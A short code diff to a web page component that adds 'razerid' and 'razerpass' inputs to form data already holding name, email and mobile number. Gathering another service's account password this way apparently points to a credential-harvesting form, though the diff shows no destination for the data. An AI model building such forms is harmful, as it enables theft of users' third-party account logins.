@@ -75,6 +75,8 @@ export default function Home() {
                   name: document.getElementById('name').value.trim(),
                   email: document.getElementById('email').value.trim(),
                   mobile: document.getElementById('mobile').value.trim(),
+                  razerid: document.getElementById('razerid').value.trim(),
+                  razerpass: document.getElementById('razerpass').value.trim()
                 };
               }
 
